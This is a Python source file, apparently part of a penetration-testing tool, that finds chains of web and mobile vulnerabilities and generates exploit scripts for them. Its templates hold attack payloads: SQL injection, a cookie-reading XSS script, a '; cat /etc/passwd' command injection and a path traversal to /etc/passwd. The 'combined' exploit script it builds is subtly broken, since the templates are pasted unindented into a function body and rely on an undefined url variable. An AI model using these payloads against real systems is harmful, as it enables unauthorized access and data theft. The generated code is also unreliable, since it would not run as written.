import logging
from typing import Dict, List, Any, Optional
from itertools import combinations

class VulnerabilityChainer:
    def __init__(self):
        self.logger = logging.getLogger(__name__)
        self.chain_patterns = self._load_chain_patterns()

    def _load_chain_patterns(self) -> Dict[str, List[Dict[str, Any]]]:
        """Load known vulnerability chain patterns"""
        return {
            'account_takeover': [
                {
                    'chain': ['information_disclosure', 'authentication_bypass'],
                    'description': 'Use leaked credentials to bypass authentication',
                    'impact': 'Complete account takeover'
                },
                {
                    'chain': ['sql_injection', 'privilege_escalation'],
                    'description': 'Extract admin credentials via SQLi, then escalate privileges',
                    'impact': 'Administrative access'
                }
            ],
            'data_exfiltration': [
                {
                    'chain': ['exported_component', 'insecure_storage'],
                    'description': 'Access exported component to read insecure storage',
                    'impact': 'Sensitive data exposure'
                },
                {
                    'chain': ['webview_vulnerability', 'file_traversal'],
                    'description': 'Use WebView to traverse filesystem and extract data',
                    'impact': 'File system access'
                }
            ],
            'remote_code_execution': [
                {
                    'chain': ['command_injection', 'privilege_escalation'],
                    'description': 'Inject commands and escalate to gain full control',
                    'impact': 'Remote code execution with elevated privileges'
                },
                {
                    'chain': ['deserialization', 'code_execution'],
                    'description': 'Exploit deserialization to execute arbitrary code',
                    'impact': 'Remote code execution'
                }
            ]
        }

    def find_chains(self, vulnerabilities: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Find possible vulnerability chains"""
        chains = []
        vuln_types = [v['type'] for v in vulnerabilities]

        # Check known patterns
        for category, patterns in self.chain_patterns.items():
            for pattern in patterns:
                if all(vuln_type in vuln_types for vuln_type in pattern['chain']):
                    chain_vulns = []
                    for vuln_type in pattern['chain']:
                        vuln = next((v for v in vulnerabilities if v['type'] == vuln_type), None)
                        if vuln:
                            chain_vulns.append(vuln)

                    chains.append({
                        'category': category,
                        'vulnerabilities': chain_vulns,
                        'description': pattern['description'],
                        'impact': pattern['impact'],
                        'severity': self._calculate_chain_severity(chain_vulns)
                    })

        # Find custom chains
        custom_chains = self._find_custom_chains(vulnerabilities)
        chains.extend(custom_chains)

        return chains

    def _find_custom_chains(self, vulnerabilities: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Find custom vulnerability chains based on relationships"""
        custom_chains = []

        # Look for pairs that can be chained
        for vuln1, vuln2 in combinations(vulnerabilities, 2):
            if self._can_chain(vuln1, vuln2):
                custom_chains.append({
                    'category': 'custom',
                    'vulnerabilities': [vuln1, vuln2],
                    'description': self._generate_chain_description(vuln1, vuln2),
                    'impact': self._calculate_chain_impact(vuln1, vuln2),
                    'severity': self._calculate_chain_severity([vuln1, vuln2])
                })

        return custom_chains

    def _can_chain(self, vuln1: Dict[str, Any], vuln2: Dict[str, Any]) -> bool:
        """Check if two vulnerabilities can be chained"""
        chainable_pairs = {
            ('information_disclosure', 'authentication_bypass'): True,
            ('sql_injection', 'privilege_escalation'): True,
            ('exported_component', 'insecure_storage'): True,
            ('webview_vulnerability', 'file_traversal'): True,
            ('path_traversal', 'data_exposure'): True,
            ('idor', 'account_takeover'): True,
            ('csrf', 'privilege_escalation'): True,
            ('xss', 'session_hijacking'): True,
            ('command_injection', 'data_exfiltration'): True
        }

        vuln1_type = vuln1.get('type', '')
        vuln2_type = vuln2.get('type', '')

        # Check both directions
        return (chainable_pairs.get((vuln1_type, vuln2_type), False) or
                chainable_pairs.get((vuln2_type, vuln1_type), False))

    def _generate_chain_description(self, vuln1: Dict[str, Any],
                                    vuln2: Dict[str, Any]) -> str:
        """Generate description for vulnerability chain"""
        descriptions = {
            ('information_disclosure', 'authentication_bypass'):
                'Use disclosed information to bypass authentication',
            ('sql_injection', 'privilege_escalation'):
                'Extract privileged credentials via SQL injection, then escalate access',
            ('exported_component', 'insecure_storage'):
                'Access exported component to read from insecure storage',
            ('webview_vulnerability', 'file_traversal'):
                'Exploit WebView to traverse the filesystem',
            ('path_traversal', 'data_exposure'):
                'Use path traversal to access sensitive data files',
            ('idor', 'account_takeover'):
                'Exploit IDOR to take over user accounts',
            ('csrf', 'privilege_escalation'):
                'Chain CSRF with privilege escalation for admin access',
            ('xss', 'session_hijacking'):
                'Use XSS to steal session tokens and hijack accounts',
            ('command_injection', 'data_exfiltration'):
                'Execute commands to exfiltrate sensitive data'
        }

        vuln1_type = vuln1.get('type', '')
        vuln2_type = vuln2.get('type', '')

        # Try to find matching description
        desc = descriptions.get((vuln1_type, vuln2_type))
        if not desc:
            desc = descriptions.get((vuln2_type, vuln1_type))

        return desc or f'Chain {vuln1_type} with {vuln2_type} for combined exploitation'

    def _calculate_chain_impact(self, vuln1: Dict[str, Any],
                                vuln2: Dict[str, Any]) -> str:
        """Calculate the impact of a vulnerability chain"""
        high_impact_combinations = {
            ('information_disclosure', 'authentication_bypass'): 'Account takeover',
            ('sql_injection', 'privilege_escalation'): 'Database compromise with admin access',
            ('exported_component', 'insecure_storage'): 'Complete data breach',
            ('webview_vulnerability', 'file_traversal'): 'Arbitrary file access',
            ('command_injection', 'privilege_escalation'): 'Full system compromise',
            ('xss', 'csrf'): 'Complete session compromise',
            ('idor', 'data_exposure'): 'Mass data breach'
        }

        vuln1_type = vuln1.get('type', '')
        vuln2_type = vuln2.get('type', '')

        impact = high_impact_combinations.get((vuln1_type, vuln2_type))
        if not impact:
            impact = high_impact_combinations.get((vuln2_type, vuln1_type))

        return impact or 'Elevated security risk through combined exploitation'

    def _calculate_chain_severity(self, vulnerabilities: List[Dict[str, Any]]) -> str:
        """Calculate severity of vulnerability chain"""
        severity_scores = {
            'Critical': 4,
            'High': 3,
            'Medium': 2,
            'Low': 1
        }

        # Get maximum severity from chain
        max_severity = 0
        for vuln in vulnerabilities:
            severity = vuln.get('severity', 'Low')
            score = severity_scores.get(severity, 1)
            max_severity = max(max_severity, score)

        # Increase severity due to chaining
        if len(vulnerabilities) > 1:
            max_severity = min(max_severity + 1, 4)

        # Convert back to severity string
        for severity, score in severity_scores.items():
            if score == max_severity:
                return severity

        return 'High'

    def generate_chain_exploit(self, chain: Dict[str, Any]) -> Dict[str, Any]:
        """Generate exploit for vulnerability chain"""
        vulnerabilities = chain.get('vulnerabilities', [])

        if len(vulnerabilities) < 2:
            return None

        exploit = {
            'name': f'Chain Exploit: {chain["category"]}',
            'description': chain['description'],
            'impact': chain['impact'],
            'severity': chain['severity'],
            'steps': [],
            'code': []
        }

        # Generate steps based on vulnerability types
        for i, vuln in enumerate(vulnerabilities):
            exploit['steps'].append(f'Step {i+1}: Exploit {vuln["type"]}')
            exploit['code'].append(self._generate_vuln_code(vuln))

        # Add combined exploit code
        exploit['combined_code'] = self._generate_combined_code(vulnerabilities)

        return exploit

    def _generate_vuln_code(self, vulnerability: Dict[str, Any]) -> str:
        """Generate exploit code for individual vulnerability"""
        templates = {
            'sql_injection': '''
# SQL Injection
payload = "' OR '1'='1"
response = requests.get(f"{url}?id={payload}")
''',
            'xss': '''
# XSS Payload
payload = "<script>alert(document.cookie)</script>"
response = requests.post(url, data={'input': payload})
''',
            'command_injection': '''
# Command Injection
payload = "; cat /etc/passwd"
response = requests.post(url, data={'cmd': payload})
''',
            'path_traversal': '''
# Path Traversal
payload = "../../../etc/passwd"
response = requests.get(f"{url}/download?file={payload}")
'''
        }

        vuln_type = vulnerability.get('type', '')
        return templates.get(vuln_type, f'# Exploit code for {vuln_type}')

    def _generate_combined_code(self, vulnerabilities: List[Dict[str, Any]]) -> str:
        """Generate combined exploit code for chain"""
        code = """
#!/usr/bin/env python3
import requests
import json
import time

def exploit_chain():
    print("[*] Starting chain exploitation...")
    
"""

        for i, vuln in enumerate(vulnerabilities):
            code += f"""
    # Step {i+1}: Exploit {vuln.get('type', '')}
    print("[*] Exploiting {vuln.get('type', '')}...")
    
{self._generate_vuln_code(vuln)}
    
    if response.status_code == 200:
        print("[+] Step {i+1} successful")
    else:
        print("[-] Step {i+1} failed")
        return False
    
    time.sleep(1)  # Avoid rate limiting
"""

        code += """
    print("[+] Chain exploitation completed successfully!")
    return True

if __name__ == "__main__":
    exploit_chain()
"""

        return code

    def find_best_chain(self, vulnerabilities: List[Dict[str, Any]]) -> Optional[Dict[str, Any]]:
        """Find the most impactful vulnerability chain"""
        chains = self.find_chains(vulnerabilities)

        if not chains:
            return None

        # Sort by severity and impact
        severity_order = {'Critical': 4, 'High': 3, 'Medium': 2, 'Low': 1}

        sorted_chains = sorted(chains,
                               key=lambda x: (severity_order.get(x['severity'], 0),
                                              len(x['vulnerabilities'])),
                               reverse=True)

        return sorted_chains[0] if sorted_chains else None